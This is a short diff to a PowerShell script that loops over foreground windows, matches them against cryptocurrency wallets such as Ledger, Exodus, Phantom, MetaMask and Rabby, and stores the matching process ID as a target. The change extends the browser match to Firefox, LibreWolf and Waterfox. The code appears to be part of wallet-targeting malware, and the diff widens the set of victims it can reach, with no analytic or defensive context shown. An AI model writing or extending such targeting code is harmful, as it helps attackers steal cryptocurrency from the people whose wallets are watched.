@@ -75,7 +75,7 @@ while ($true) {
         $name = 'ledger'; $target = $processId
     } elseif ($title -match '(?i)^exodus|exodus wallet' -and $foreground -match '(?i)exodus') {
         $name = 'exodus'; $target = $processId
-    } elseif ($foreground -match '(?i)chrome|msedge|brave') {
+    } elseif ($foreground -match '(?i)chrome|msedge|brave|firefox|librewolf|waterfox') {
         if ($title -match '(?i)phantom') { $name = 'phantom'; $target = $processId }
         elseif ($title -match '(?i)metamask') { $name = 'metamask'; $target = $processId }
         elseif ($title -match '(?i)rabby') { $name = 'rabby'; $target = $processId }
